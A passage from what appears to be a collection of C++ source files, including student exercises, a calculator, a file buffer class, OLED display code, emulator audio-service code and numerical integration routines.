4:\n\t\t\tcout << \"Pushed Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "#include <iostream>\n#include <chrono>\nusing namespace std;\nusing namespace std::chrono;\n//note : the code is work in online compiler\ndouble fact(double x){\n    double f = 1 ;\n    for(int i = 1 ; i<=x ; i++)\n        f *= i ;\n    return f ;\n}\n\ndouble recfact(double x){\n    if(x==0 || x==1 )\n        return 1 ;\n    return x * recfact(x-1) ;\n}\n\nint main()\n{\n    long int x = 100000000000;\n    for(int i = 1 ; i<=x ; i= i*2){\n        auto start = high_resolution_clock::now();\n        double result1 = fact(i);\n        auto stop = high_resolution_clock::now();\n        auto duration = duration_cast<nanoseconds>(stop - start);\n        cout << \"The factorial of \" << i << \" is: \" << result1 << \" and the execution time is: \" << duration.count() << \" nanoseconds\" << endl;\n        if(result1 == 0)\n            cout << \"Error in factorial calculation\" << endl;\n\n        start = high_resolution_clock::now();\n        double result2 = recfact(i);\n        stop = high_resolution_clock::now();\n        duration = duration_cast<nanoseconds>(stop - start);\n        cout << \"The recursive factorial of \" << i << \" is: \" << result2 << \" and the execution time is: \" << duration.count() << \" nanoseconds\" << endl;\n        if(result2 == 0)\n            cout << \"Error in recursive factorial calculation\" << endl;\n\n        cout << endl;\n    }\n\n    return 0;\n}\n",
    "/* Creation date: 4-2-2024\n   Teacher: Dr. Tyson McMillan \n   School: Tarrant County College\n   Purpose: A basic calculator that calculates the velocity, acceleration, motion,\n   weight, momentum, and newton's second law given the right inputs and options.\n   Skills learned/gained from the assignment: I learned how to utilize the while\n   loop more efficiently.\n*/\n#include <iostream>\n#include <math.h>\n\nusing namespace std;\n\nvoid calculateVelocity();\nvoid calculateAcceleration();\nvoid calculateMotion();\nvoid calculateWeight();\nvoid calculateMomentum();\nvoid calculateNewtonSecondLaw();\n\nint main(){\n  while(true){\n    char option;\n    cout <<\"What do you want to calculate. \\nEnter 'V' to calculate velocity, 'A' to calculate acceleration, 'M' to calculate motion, 'W' to calculate weight, 'P' to calculate momentum, or 'E' to end the whole program \"<< endl;\n    restart: \n      cin >> option;\n\n    if(option == 'V'){\n      calculateVelocity();\n    }\n    else if(option == 'A'){\n      calculateAcceleration();\n    }\n    else if(option == 'M'){\n      calculateMotion();\n    }\n    else if(option == 'W'){\n      calculateWeight();\n    }\n    else if(option == 'P'){\n      calculateMomentum();\n    }\n    else if(option == 'N'){\n      calculateNewtonSecondLaw();\n    }\n    else if(option == 'E'){\n      exit (0);\n    }\n    else{\n      cout << \"Please Enter a valid input: \"<< endl;\n      goto restart;\n    }\n\n  }\n\n  return 0; \n}\n\nvoid calculateVelocity(){\n  double ds = 0.0, dt = 0.0, v = 0.0;\n  string  dsUnits = \"\", dtUnits = \"\";\n\n  cout << \"Enter the value for change in distance: \"<< endl;\n  cin >> ds;\n  cout << \"Enter the unit for distance: \"<< endl;\n  cin >> dsUnits;\n\n\n  cout << \"Enter the value for change in time: \"<< endl;\n  cin >> dt;\n  cout << \"Enter the unit time: \"<< endl;\n  cin >> dtUnits;\n\n  v = ds/dt;\n\n  cout<< \"The is velocity is: \"<< v << \"=\" << dsUnits << \"/\" << dtUnits << endl;\t\n}\n\nvoid calculateAcceleration(){\n  double dv = 0.0, dt = 0.0, a = 0.0;\n  string  dvUnits = \"\", dtUnits = \"\";\n\n  cout << \"Enter the value for change in velocity: \"<< endl;\n  cin >> dv;\n  cout << \"Enter the unit for velocity: \"<< endl;\n  cin >> dvUnits;\n\n\n  cout << \"Enter the value for change in time: \"<< endl;\n  cin >> dt;\n  cout << \"Enter the unit time: \"<< endl;\n  cin >> dtUnits;\n\n  a = dv/dt;\n\n  cout<< \"The is acceleration is: \"<< a << \"=\" << dvUnits << \"/\" << dtUnits << endl;\t\n}\n\nvoid calculateMotion(){\n  while(true){\n    char option;\n    cout <<\"Enter 'a' to solve v, 's' solve for s, 'd' to solve for v^2, or 'v' to solve for v_bar \"<< endl;\n    restart: \n      cin >> option;\n\n    if(option == 'a'){\n      double v = 0.0, v0 = 0.0, a = 0.0, t = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial time: \"<< endl;\n      cin >> t;\n\n      v = v0 + (a*t);\n\n      cout << \"The velocity: \"<< v << endl;\n\n      }\n    else if(option == 's'){\n      double s0 = 0.0, v0 = 0.0, a = 0.0, t = 0.0, s = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial time: \"<< endl;\n      cin >> t;\n      cout << \"Enter initial initial distance: \"<< endl;\n      cin >> s0;\n\n      s = s0 + (v0*t) + (0.5*a*pow(t,2));\n\n      cout << \"The final distance is: \"<< s << endl;\n    }\n    else if(option == 'd'){\n      double v = 0.0, v0 = 0.0, s = 0.0, s0 = 0.0, a = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial distance: \"<< endl;\n      cin >> s0;\n      cout << \"Enter final distance: \"<< endl;\n      cin >> s;\n\n\n      v = pow(v0, 2) + (2 * a * (s-s0));\n\n      cout << \"The v^2: \"<< v << endl;\n    }\n    else if(option == 'v'){\n      double v = 0.0, v0 = 0.0, v_bar = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the final velocity: \"<< endl;\n      cin >> v;\n\n      v_bar = 0.5 * (v+v0);\n\n      cout << \"The v_bar: \"<< v_bar << endl;\n\n    }\n    else{\n      cout << \"Please Enter a valid input: \"<< endl;\n      goto restart;\n    }\n\n  }\n}\n\nvoid calculateNewtonSecondLaw(){\n  double N = 0.0, m = 0.0, a = 0.0;\n  string mUnits = \" \", aUnits = \" \";\n\n  cout << \"Enter the mass: \"<< endl;\n  cin >> m;\n  cout << \"Enter the unit mass: \"<< endl;\n  cin >> mUnits;\n  cout << \"Enter the acceleration: \"<< endl;\n  cin >> a;\n  cout << \"Enter the unit for acceleration: \"<< endl;\n  cin >> aUnits;\n\n  N = m*a;\n\n  cout<< \"The calculated force is: \"<< N << mUnits << \" \" << aUnits << endl;\n}\n\nvoid calculateWeight(){\n  double W = 0.0, m = 0.0, g = 0.0;\n  string mUnits = \" \", gUnits = \" \";\n\n  cout << \"Enter the mass: \"<< endl;\n  cin >> m;\n  cout << \"Enter the unit mass: \"<< endl;\n  cin >> mUnits;\n  cout << \"Enter the gravity: \"<< endl;\n  cin >> g;\n  cout << \"Enter the unit for gravity: \"<< endl;\n  cin >> gUnits;\n\n  W = m*g;\n\n  cout<< \"",
    "//\n//  File.cpp\n//  NrIO\n//\n//  Created by Nyhl Rawlings on 15/01/2020.\n//  Copyright \u00a9 2020 Liquidsoft Studio. All rights reserved.\n//\n\n#include \"File.h\"\n\nnamespace nrcore {\n\n    File::File(const char *path) : Memory(FILE_BUFFER_SIZE), fill(0), offset(0), update_file(false)  {\n        this->path = path;\n        \n        fp = fopen(path, \"r+\");\n        if (!fp) {\n            fp = fopen(path, \"w+\");\n            if (!fp)\n                throw \"Failed to open\";\n        }\n        \n        updateFileSize();\n        \n        fill = fread(buffer.getPtr(), 1, FILE_BUFFER_SIZE, fp);\n    }\n    \n    File::~File() {\n        if (update_file)\n            updateFile();\n        \n        if (fp)\n            fclose(fp);\n    }\n    \n    char& File::operator [](size_t index) {\n        if (index>=sz)\n            throw \"Index Out Of Range\";\n        \n        if (fill && index >= offset && index < offset+fill)\n            return Memory::operator [](index-offset);\n        \n        if (fill && update_file)\n            updateFile();\n        \n        offset = index-(index%FILE_BUFFER_SIZE);\n        fseek(fp, offset, SEEK_SET);\n        fill = fread(buffer.getPtr(), 1, FILE_BUFFER_SIZE, fp);\n        return Memory::operator [](index-offset);\n    }\n    \n    \n    Memory File::getMemory() const {\n        char *buf = new char[sz];\n        fseek(fp, 0L, SEEK_SET);\n        size_t len = fread(buf, 1, sz, fp);\n        \n        Memory mem(buf, len);\n        \n        delete[] buf;\n        \n        return mem;\n    }\n    \n    Memory File::getSubBytes(size_t offset, size_t length) const {\n        char *buf = new char[length];\n        fseek(fp, offset, SEEK_SET);\n        length = fread(buf, 1, length, fp);\n        \n        Memory mem(buf, length);\n        \n        delete[] buf;\n        \n        return mem;\n    }\n    \n    void File::write(size_t offset, const char* data, size_t length) {\n        size_t len = 0;\n        if (update_file) {\n            if (offset < this->offset) { // copy preceeding bytes\n                len = (this->offset - offset > length) ? length : this->offset - offset;\n                writeToFile(offset, data, len);\n                offset += len;\n                data += len;\n                length -= len;\n            }\n            \n            if (length) {\n                if (offset >= this->offset && offset < this->offset+fill) {\n                    size_t coffset = this->offset - offset;\n                    len = (fill-coffset) < length ? fill-coffset : length;\n                    char *buf = &buffer.getPtr()[coffset];\n                    memcpy(buf, data, len);\n                    \n                    offset += len;\n                    data += len;\n                    length -= len;\n                }\n            }\n            \n            if (length) {\n                writeToFile(offset, data, length);\n                updateFileSize();\n            }\n            \n        } else {\n            writeToFile(offset, data, length);\n            updateFileSize();\n        }\n    }\n\n    Memory File::read(size_t offset, size_t length) const {\n        Memory buffer(length);\n        \n        fseek(fp, offset, SEEK_SET);\n        size_t fill = fread(buffer.getPtr(), 1, length, fp);\n        fseek(fp, this->offset, SEEK_SET);\n        \n        return Memory(buffer.operator char *(), fill);\n    }\n    \n    size_t File::length() const {\n        return sz;\n    }\n    \n    void File::setFileUpdating(bool val) {\n        update_file = val;\n    }\n    \n    void File::grow(size_t size) {\n        char byte = 0;\n        fseek(fp, 0, SEEK_END);\n        \n        sz += size;\n        \n        while(size--)\n            fwrite(&byte, 1, 1, fp);\n    }\n    \n    void File::truncate() {\n        if (fp) {\n            offset = 0;\n            fp = freopen(NULL, \"w+\", fp);\n        }\n    }\n    \n    int File::fileno() {\n        return ::fileno(fp);\n    }\n\n    void File::updateFileSize() {\n        fseek(fp, 0L, SEEK_END);\n        sz = ftell(fp);\n        fseek(fp, 0L, SEEK_SET);\n    }\n    \n    void File::updateFile(){\n        fseek(fp, offset, SEEK_SET);\n        size_t written = 0;\n        while(written < fill)\n            fwrite(&buffer.getPtr()[written], 1, fill, fp);\n        fflush(fp);\n    }\n    \n    void File::writeToFile(size_t offset, const char* data, size_t length) {\n        fseek(fp, offset, SEEK_SET);\n        size_t written = 0;\n        while(written < length)\n            written += fwrite(&data[written], 1, length, fp);\n        fflush(fp);\n    }\n\n}\n",
    "#include \"display.h\"\r\n\r\nAdafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);\r\nvoid display_setup(String value) {\r\n  display.clearDisplay();\r\n  display.setTextSize(1);\r\n  display.setTextColor(SSD1306_WHITE);\r\n  display.setCursor(0, 5);            // Start at top-left corner\r\n  display.println(F(\"----Please Wait!----\"));\r\n  display.println(F(\"\"));\r\n  display.println(F(\"\"));\r\n  display.print(F(\"Setting: \"));\r\n  display.println(value);\r\n  \r\n\r\n  display.display();\r\n  delay(2000);\r\n}\r\nvoid display_Init() {\r\n  display.begin(SSD1306_SWITCHCAPVCC, 0x3C); //initialize with the I2C addr 0x3C (128x64)\r\n  display.clearDisplay();\r\n\r\n  display.setTextSize(1);\r\n  display.setTextColor(SSD1306_WHITE);\r\n  display.setCursor(0, 5);            // Start at top-left corner\r\n  display.println(F(\"----Please Wait!----\"));\r\n\r\n  display.setTextSize(2);             // Draw 2X-scale text\r\n  display.setTextColor(SSD1306_WHITE);\r\n  display.setCursor(16, 32);\r\n  display.print(F(\"Booting\"));\r\n  display.display();\r\n  delay(6000);\r\n}\r\n\r\nvoid show_display(float batt_voltage, float batt_persent, float temp, float hum) {\r\n  display.clearDisplay();\r\n\r\n  display.setTextSize(1);             // Normal 1:1 pixel scale\r\n  display.setTextColor(SSD1306_WHITE);        // Draw white text\r\n  display.setCursor(0, 0);            // Start at top-left corner\r\n  display.print(F(\"Voltage:\"));\r\n  display.print(batt_voltage);\r\n  display.println(F(\"V\"));\r\n  display.println(F(\"\"));\r\n\r\n  display.print(F(\"Battery Left:\"));\r\n  display.print(batt_persent);\r\n  display.println(F(\"%\"));\r\n  display.println(F(\"\"));\r\n\r\n  display.print(F(\"Temperature:\"));\r\n  display.print(temp);\r\n  display.println(F(\"C\"));\r\n  display.println(F(\"\"));\r\n\r\n  display.print(F(\"Humidity:\"));\r\n  display.print(hum);\r\n  display.println(F(\"%\"));\r\n\r\n\r\n  display.display();\r\n  delay(100);\r\n}\r\n",
    "#include <iostream>\n\n#include \"concrete_handler.h\"\n\nvoid ConcreteHandlerA::setNext(Handler* next) {\n    nextHandler = next;\n}\n\nvoid ConcreteHandlerA::handleRequest(int request) {\n    if (request <= 10) {\n        // \u5904\u7406\u8bf7\u6c42\u7684\u903b\u8f91\n        std::cout << \"RequestA \" << request << std::endl;\n    } else if (nextHandler != NULL) {\n        nextHandler->handleRequest(request);\n    } else {\n        // \u65e0\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u903b\u8f91\n    }\n}\n\nvoid ConcreteHandlerB::setNext(Handler* next) {\n    nextHandler = next;\n}\n\nvoid ConcreteHandlerB::handleRequest(int request) {\n    if (request > 10 && request <= 20) {\n        // \u5904\u7406\u8bf7\u6c42\u7684\u903b\u8f91\n        std::cout << \"RequestB \" << request << std::endl;\n    } else if (nextHandler != NULL) {\n        nextHandler->handleRequest(request);\n    } else {\n        // \u65e0\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u903b\u8f91\n    }\n}\n\nvoid ConcreteHandlerC::setNext(Handler* next) {\n    nextHandler = next;\n}\n\nvoid ConcreteHandlerC::handleRequest(int request) {\n    if (request > 20 && request <= 30) {\n        // \u5904\u7406\u8bf7\u6c42\u7684\u903b\u8f91\n        std::cout << \"RequestC \" << request << std::endl;\n    } else if (nextHandler != NULL) {\n        nextHandler->handleRequest(request);\n    } else {\n        // \u65e0\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u903b\u8f91\n    }\n}\n",
    "/*\n * Name: Grant Johnson, Ethan Sychangco\n * Email: Gmjohnson@scu.edu, Esychangco@scu.edu\n */\n\n#include <iostream>\n#include \"mystring.h\"\n\nusing namespace lab5GE;\n\nint main(){\n    // TEST CONSTRUCTOR by initializing three strings in 3 different ways\n    std::cout << \"\\n[Testing Constructor]\" << std::endl;\n    string s1; // default constructor\n    string s2('s'); // char constructor\n    string s3(\"Hello, World!\"); // string constructor\n\n    std::cout << \"s1: \" << s1 << std::endl;\n    std::cout << \"s2: \" << s2 << std::endl;\n    std::cout << \"s3: \" << s3 << std::endl;\n\n\n    // TEST += operator\n    std::cout << \"\\n[Testing +=]\" << std::endl;\n\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1 += 'A';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    s1 += 'B';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    s1 += 'C';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n\n\n    // TEST [] operator\n    std::cout << \"\\n[Testing []]\" << std::endl;\n\n    std::cout << \"s1[0]: \" << s1[0] << std::endl;\n    std::cout << \"s1[1]: \" << s1[1] << std::endl;\n    std::cout << \"s1[2]: \" << s1[2] << std::endl;\n\n\n    // TEST == operator\n    std::cout << \"\\n[Testing =]\" << std::endl;\n\n    std::cout << \"s3 before s3 = s1: \" << s3 << std::endl;\n    s3 = s1;\n    std::cout << \"s3 after s3 = s1: \" << s3 << std::endl;\n    std::cout << \"s2 before s2 = s2: \" << s2 << std::endl;\n    s2 = s2;\n    std::cout << \"s2 after s2 = s2: \" << s2 << std::endl;\n\n\n    // TEST COMPARISON operators\n    std::cout << \"\\n[Testing Comparisons]\" << std::endl;\n    string A('A');\n    string B('B');\n\n    std::cout << \"A == A: \" << (A == A) << std::endl;\n    std::cout << \"A == B: \" << (A == B) << std::endl;\n    std::cout << \"A != A: \" << (A != A) << std::endl;\n    std::cout << \"A != B: \" << (A != B) << std::endl;\n    std::cout << \"A > A: \" << (A > A) << std::endl;\n    std::cout << \"A > B: \" << (A > B) << std::endl;\n    std::cout << \"B > A: \" << (B > A) << std::endl;\n    std::cout << \"A >= A: \" << (A >= A) << std::endl;\n    std::cout << \"A >= B: \" << (A >= B) << std::endl;\n    std::cout << \"B >= A: \" << (B >= A) << std::endl;\n    std::cout << \"A < A: \" << (A < A) << std::endl;\n    std::cout << \"A < B: \" << (A < B) << std::endl;\n    std::cout << \"B < A: \" << (B < A) << std::endl;\n    std::cout << \"A <= A: \" << (A <= A) << std::endl;\n    std::cout << \"A <= B: \" << (A <= B) << std::endl;\n    std::cout << \"B <= A: \" << (B <= A) << std::endl;;\n\n    \n    // TEST OUTPUT operator\n    string input;\n    std::cout << \"\\n[Testing <<]\" << std::endl;\n    std::cout << \"Please enter a word: \";\n    std::cin >> input;\n    std::cout << \"You entered: \" << input << std::endl;\n\n\n    // TEST INSERT function\n    // s1 should be \"ABC\" at this point\n    std::cout << \"\\n[Testing insert()]\" << std::endl;\n    string sinsert1 = string(\"Strings like \");\n    string sinsert2 = string(\" are **~very~** epic.\");\n\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(string('D'), 3); // <?> INDEX IS 3 OR 4???\n    std::cout << \"-> Insert 'D' at pos 3 \" << std::endl; \n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(sinsert1, 0);\n    std::cout << \"-> Insert \\\"\" << sinsert1 << \"\\\" at pos 0 \" << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(sinsert2, 17);\n    std::cout << \"-> Insert \\\"\" << sinsert2 << \"\\\" at pos 17 \" << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n\n\n    // TEST DELETE function\n    // s1 should be \"Strings like ABCD are **~very~** epic.\" at this point\n    std::cout << \"\\n[Testing dlt()]\" << std::endl;\n    std::cout << \"s1: \" << s1  << std::endl; \n    s1.dlt(8, 10);\n    std::cout << \"-> Delete 10 chars starting at pos 8\" << std::endl;     \n    std::cout << \"s1: \" << s1  << std::endl; \n\n\n    // TEST REPLACE function\n    std::cout << \"\\n[Testing replace()]\" << std::endl;\n    string s4 = string(\"abc\");\n    string srep1 = string('y');\n    string srep2 = string(\"z\");\n    string srep3 = string(\"123\");\n\n    std::cout << \"s4: \" << s4 << std::endl; \n    s4.replace('x', 0);\n    std::cout << \"-> Replace with 'x' at pos 0 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep1, 1);\n    std::cout << \"-> Replace with string '\" << srep1 << \"' at pos 1 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep2, 2);\n    std::cout << \"-> Replace with string \\\"\" << srep2 << \"\\\" at pos 2 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep3, 0);\n    std::cout << \"-> Replace with string \\\"\" << srep3 << \"\\\" at pos 0 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n\n\n    // TEST COUNT function\n    std::cout << \"\\n[Testing count()]\" << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    std::cout << \"'a' in s1: \" << s1.count('a') << std::endl;\n   ",
    "// SPDX-FileCopyrightText: Copyright 2024 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"audio_core/audio_core.h\"\n#include \"common/string_util.h\"\n#include \"core/hle/service/audio/audio_device.h\"\n#include \"core/hle/service/cmif_serialization.h\"\n\nnamespace Service::Audio {\nusing namespace AudioCore::Renderer;\n\nIAudioDevice::IAudioDevice(Core::System& system_, u64 applet_resource_user_id, u32 revision,\n                           u32 device_num)\n    : ServiceFramework{system_, \"IAudioDevice\"}, service_context{system_, \"IAudioDevice\"},\n      impl{std::make_unique<AudioDevice>(system_, applet_resource_user_id, revision)},\n      event{service_context.CreateEvent(fmt::format(\"IAudioDeviceEvent-{}\", device_num))} {\n    static const FunctionInfo functions[] = {\n        {0, D<&IAudioDevice::ListAudioDeviceName>, \"ListAudioDeviceName\"},\n        {1, D<&IAudioDevice::SetAudioDeviceOutputVolume>, \"SetAudioDeviceOutputVolume\"},\n        {2, D<&IAudioDevice::GetAudioDeviceOutputVolume>, \"GetAudioDeviceOutputVolume\"},\n        {3, D<&IAudioDevice::GetActiveAudioDeviceName>, \"GetActiveAudioDeviceName\"},\n        {4, D<&IAudioDevice::QueryAudioDeviceSystemEvent>, \"QueryAudioDeviceSystemEvent\"},\n        {5, D<&IAudioDevice::GetActiveChannelCount>, \"GetActiveChannelCount\"},\n        {6, D<&IAudioDevice::ListAudioDeviceNameAuto>, \"ListAudioDeviceNameAuto\"},\n        {7, D<&IAudioDevice::SetAudioDeviceOutputVolumeAuto>, \"SetAudioDeviceOutputVolumeAuto\"},\n        {8, D<&IAudioDevice::GetAudioDeviceOutputVolumeAuto>, \"GetAudioDeviceOutputVolumeAuto\"},\n        {10, D<&IAudioDevice::GetActiveAudioDeviceNameAuto>, \"GetActiveAudioDeviceNameAuto\"},\n        {11, D<&IAudioDevice::QueryAudioDeviceInputEvent>, \"QueryAudioDeviceInputEvent\"},\n        {12, D<&IAudioDevice::QueryAudioDeviceOutputEvent>, \"QueryAudioDeviceOutputEvent\"},\n        {13, D<&IAudioDevice::GetActiveAudioDeviceName>, \"GetActiveAudioOutputDeviceName\"},\n        {14, D<&IAudioDevice::ListAudioOutputDeviceName>, \"ListAudioOutputDeviceName\"},\n    };\n    RegisterHandlers(functions);\n\n    event->Signal();\n}\n\nIAudioDevice::~IAudioDevice() {\n    service_context.CloseEvent(event);\n}\n\nResult IAudioDevice::ListAudioDeviceName(\n    OutArray<AudioDevice::AudioDeviceName, BufferAttr_HipcMapAlias> out_names, Out<s32> out_count) {\n    R_RETURN(this->ListAudioDeviceNameAuto(out_names, out_count));\n}\n\nResult IAudioDevice::SetAudioDeviceOutputVolume(\n    InArray<AudioDevice::AudioDeviceName, BufferAttr_HipcMapAlias> name, f32 volume) {\n    R_RETURN(this->SetAudioDeviceOutputVolumeAuto(name, volume));\n}\n\nResult IAudioDevice::GetAudioDeviceOutputVolume(\n    Out<f32> out_volume, InArray<AudioDevice::AudioDeviceName, BufferAttr_HipcMapAlias> name) {\n    R_RETURN(this->GetAudioDeviceOutputVolumeAuto(out_volume, name));\n}\n\nResult IAudioDevice::GetActiveAudioDeviceName(\n    OutArray<AudioDevice::AudioDeviceName, BufferAttr_HipcMapAlias> out_name) {\n    R_RETURN(this->GetActiveAudioDeviceNameAuto(out_name));\n}\n\nResult IAudioDevice::ListAudioDeviceNameAuto(\n    OutArray<AudioDevice::AudioDeviceName, BufferAttr_HipcAutoSelect> out_names,\n    Out<s32> out_count) {\n    *out_count = impl->ListAudioDeviceName(out_names);\n\n    std::string out{};\n    for (s32 i = 0; i < *out_count; i++) {\n        std::string a{};\n        u32 j = 0;\n        while (out_names[i].name[j] != '\\0') {\n            a += out_names[i].name[j];\n            j++;\n        }\n        out += \"\\n\\t\" + a;\n    }\n\n    LOG_DEBUG(Service_Audio, \"called.\\nNames={}\", out);\n    R_SUCCEED();\n}\n\nResult IAudioDevice::SetAudioDeviceOutputVolumeAuto(\n    InArray<AudioDevice::AudioDeviceName, BufferAttr_HipcAutoSelect> name, f32 volume) {\n    R_UNLESS(!name.empty(), Audio::ResultInsufficientBuffer);\n\n    const std::string device_name = Common::StringFromBuffer(name[0].name);\n    LOG_DEBUG(Service_Audio, \"called. name={}, volume={}\", device_name, volume);\n\n    if (device_name == \"AudioTvOutput\") {\n        impl->SetDeviceVolumes(volume);\n    }\n\n    R_SUCCEED();\n}\n\nResult IAudioDevice::GetAudioDeviceOutputVolumeAuto(\n    Out<f32> out_volume, InArray<AudioDevice::AudioDeviceName, BufferAttr_HipcAutoSelect> name) {\n    R_UNLESS(!name.empty(), Audio::ResultInsufficientBuffer);\n\n    const std::string device_name = Common::StringFromBuffer(name[0].name);\n    LOG_DEBUG(Service_Audio, \"called. Name={}\", device_name);\n\n    *out_volume = 1.0f;\n    if (device_name == \"AudioTvOutput\") {\n        *out_volume = impl->GetDeviceVolume(device_name);\n    }\n\n    R_SUCCEED();\n}\n\nResult IAudioDevice::GetActiveAudioDeviceNameAuto(\n    OutArray<AudioDevice::AudioDeviceName, BufferAttr_HipcAutoSelect> out_name) {\n    R_UNLESS(!out_name.empty(), Audio::ResultInsufficientBuffer);\n    out_name[0] = AudioDevice::AudioDeviceName(\"AudioTvOutput\");\n    LOG_DEBUG(Service_Audio, \"(STUBBED) called\");\n    R_SUCCEED();\n}\n\nResult IAudioDevice::QueryAudioDeviceSystemEvent(OutCopyHandle<Kernel::KReadableEvent> out_event) {\n    LOG_DEBUG(Service_Audio, \"(STUBBED) called\");",
    "// Online C++ compiler to run C++ program online\n#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\n#define ROCK 1\n#define PAPER 2\n#define SCISSORS 3\n\nusing namespace std;\nint main()\n{\n    srand((unsigned int) time(NULL));\n    \n    int player_throw = 0;\n    int ai_throw = 0;\n    bool draw = false;\n    \n    do\n    {\n        cout << \"Select your throw.\" << endl;\n        cout << \"1) Rock\" << endl;\n        cout << \"2) Paper\" << endl;\n        cout << \"3) Scissors\" << endl;\n        cout << \"selection:\";\n        cin >> player_throw;\n        \n        cout << endl;\n        \n        ai_throw = (rand() % 3) +1;\n        if (ai_throw == ROCK)\n        {\n            cout << \"AI throws ROCK.\" << endl;\n        }\n        else if (ai_throw == PAPER)\n        {\n            cout << \"AI throws == PAPER.\" << endl;\n        }\n        else if (ai_throw == SCISSORS)\n        {\n            cout << \"AI throws SCISSORS.\" <<endl;\n        }\n        draw = false;\n        if (player_throw == ai_throw)\n        {\n            draw = true;\n            cout << \"Draw! Play again!\" << endl;\n        }\n        else if (player_throw == ROCK && ai_throw == SCISSORS)\n        {\n            cout << \"ROCK beats SCISSORS! YOU WIN.\" << endl;\n        }\n        else if (player_throw == ROCK && ai_throw == PAPER)\n        {\n            cout << \" PAPER beats ROCK! YOU LOSE.\" << endl;\n        }\n        else if (player_throw == PAPER && ai_throw == ROCK)\n        {\n            cout << \"PAPER beats ROCK! YOU WIN.\" << endl;\n        }\n        else if (player_throw == PAPER && ai_throw == SCISSORS)\n        {\n            cout << \"SCISSORS beats PAPER! YOU LOSE.\" <<endl;\n        }\n        else if (player_throw == SCISSORS && ai_throw == PAPER)\n        {\n            cout <<  \"SCISSORS beats PAPER! YOU WIN.\" << endl;\n        }\n        else if (player_throw == SCISSORS && ai_throw == ROCK)\n        {\n            cout << \"ROCK beats SCISSORS! YOU LOSE.\" << endl;\n        }\n        \n        cout << endl;\n        \n    \n  // rack beats scissor\n  // scissors beats paper\n  // paper beats rock\n  } while (draw);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n\n// Midpoint method\nvoid midpoint(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n\n    std::cout << \"MidPoint result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n\n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum = 0.0;\n        for (int j = 0; j < n; j++) {\n            double x_mid = a + (j + 0.5) * h; \n            sum += func(x_mid); \n        }\n        double integral = h * sum; \n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral; \n\n        if (i > 0) {\n            double diff = prev_integral - integral; \n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson; \n                std::cout << std::setw(15) << n;  \n            }\n        }\n        \n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n    }\n}\n\n// Trapezoidal method\nvoid trapezoidal(double a, double b, int iterations, double (*func)(double)) {\n    double prev_integral = 0.0; \n    double prev_prev_integral = 0.0; \n    \n    std::cout << \"Trapezoidal result:\" << std::endl;\n    std::cout   << std::setw(2)     << \"i\" \n                << std::setw(15)    << \"A(h_i)\" \n                << std::setw(20)    << \"A(h_(i-1))-A(h_i)\" \n                << std::setw(15)    << \"alp^k\" \n                << std::setw(15)    << \"Rich-error\" \n                << std::setw(15)    << \"f-calc\" \n                << std::endl;\n    \n    for (int i = 0; i <= iterations; i++) {\n        double n = pow(2, i);\n        double h = (b - a) / n;\n        double sum = 0.0;\n        for (int j = 1; j < n; j++) {\n            double x = a + j * h;\n            sum += func(x);\n        }\n        double integral = h * (0.5 * (func(a) + func(b)) + sum); \n        std::cout << std::setw(2) << i+1 << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - 